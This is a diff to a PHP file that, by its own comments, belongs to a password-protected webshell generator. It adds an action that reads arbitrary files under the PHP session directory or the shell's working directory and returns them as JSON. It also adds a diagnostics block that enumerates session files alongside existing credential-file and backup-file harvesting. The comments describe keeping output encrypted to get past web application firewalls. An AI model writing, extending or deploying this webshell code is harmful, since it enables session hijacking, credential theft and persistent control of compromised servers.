@@ -1,9 +1,50 @@
 <?php
+// On-demand session file reader used by the Diagnostics UI. Returns JSON
+// with file contents (truncated) only if the path is a regular file and
+// lies under the resolved session.save_path or the webshell working dir.
+if (isset($_POST['action']) && $_POST['action'] === 'read_session_file') {
+    header('Content-Type: application/json');
+    $path = $_POST['path'] ?? '';
+    if (!is_string($path) || $path === '') {
+        echo json_encode(['error' => 'missing path']);
+        exit;
+    }
+    $real = realpath($path);
+    if ($real === false || !is_file($real) || !is_readable($real)) {
+        echo json_encode(['error' => 'not found or not readable']);
+        exit;
+    }
+    // Resolve session.save_path (N;/path) fallback to sys_get_temp_dir()
+    $sessRaw = ini_get('session.save_path') ?: '';
+    $sessResolved = $sessRaw === '' ? sys_get_temp_dir() : $sessRaw;
+    if (preg_match('/^\d+;(.*)$/', $sessResolved, $sm))
+        $sessResolved = $sm[1];
+    $sessResolved = rtrim($sessResolved, '/');
+    $root = realpath(getcwd() ?: '.');
+    $allowed = false;
+    if ($sessResolved !== '' && strpos($real, $sessResolved) === 0) $allowed = true;
+    if ($root !== false && strpos($real, $root) === 0) $allowed = true;
+    if (!$allowed) {
+        echo json_encode(['error' => 'forbidden']);
+        exit;
+    }
+    $maxBytes = 20000;
+    $raw = @file_get_contents($real, false, null, 0, $maxBytes + 1);
+    if ($raw === false) {
+        echo json_encode(['error' => 'read failed']);
+        exit;
+    }
+    $trunc = (strlen($raw) > $maxBytes);
+    if ($trunc) $raw = substr($raw, 0, $maxBytes);
+    echo json_encode(['path' => $real, 'content' => $raw, 'truncated' => $trunc]);
+    exit;
+}
+
 if (isset($_POST['action']) && $_POST['action'] === 'diag') {
-    // crypto.php stacks [encryption, sacrificial] when --password is on. Pop only
-    // the sacrificial layer — same contract as eval.php. Popping the encryption
-    // buffer leaks raw JSON; WAFs may wrap that as <!-- base64 --> and crypto.js
-    // cannot decrypt it.
+    // crypto.php stacks [encryption, sacrificial] because generated shells
+    // always require --password. Pop only the sacrificial layer — same contract
+    // as eval.php. Popping the encryption buffer leaks raw JSON; WAFs may wrap
+    // that as <!-- base64 --> and crypto.js cannot decrypt it.
     if (ob_get_level() > 0) {
         ob_end_clean();
     }
@@ -697,6 +738,40 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
             $envContents[$ef] = $content;
     }
 
+    // --- Session save path & session files ---
+    $sessionInfo = [];
+    $sessRaw = ini_get('session.save_path') ?: '';
+    $sessResolved = $sessRaw;
+    if ($sessResolved === '')
+        $sessResolved = sys_get_temp_dir();
+    // session.save_path can be in the form "N;/path" when using user-level
+    // session handlers; extract the path portion if present.
+    if (preg_match('/^\d+;(.*)$/', $sessResolved, $sm))
+        $sessResolved = $sm[1];
+    $sessResolved = rtrim($sessResolved, '/');
+    $sessDirExists = is_dir($sessResolved);
+    $sessDirWritable = $sessDirExists && @is_writable($sessResolved);
+    $sessionFiles = [];
+    if ($sessDirExists) {
+        $matches = @glob($sessResolved . '/sess_*') ?: [];
+        foreach (array_slice($matches, 0, 200) as $sf) {
+            $sessionFiles[] = [
+                'path' => $sf,
+                'size' => @filesize($sf) ?: 0,
+                'mtime' => @filemtime($sf) ?: null,
+                'readable' => @is_readable($sf),
+                'writable' => @is_writable($sf),
+            ];
+        }
+    }
+    $sessionInfo = [
+        'ini_value' => $sessRaw,
+        'resolved_path' => $sessResolved,
+        'exists' => $sessDirExists,
+        'writable' => $sessDirWritable,
+        'files_sample' => $sessionFiles,
+    ];
+
     // --- Framework / CMS detection ---
     $frameworks = [];
     $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
@@ -1082,6 +1157,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
         'credential_files' => $credentialFiles,
         'backup_files' => $backupFiles,
         'frameworks' => $frameworks,
+        'session' => $sessionInfo,
     ];
     $__jflags = (defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0) | (defined('JSON_PARTIAL_OUTPUT_ON_ERROR') ? JSON_PARTIAL_OUTPUT_ON_ERROR : 0);
     $__out = json_encode($__diag, $__jflags);
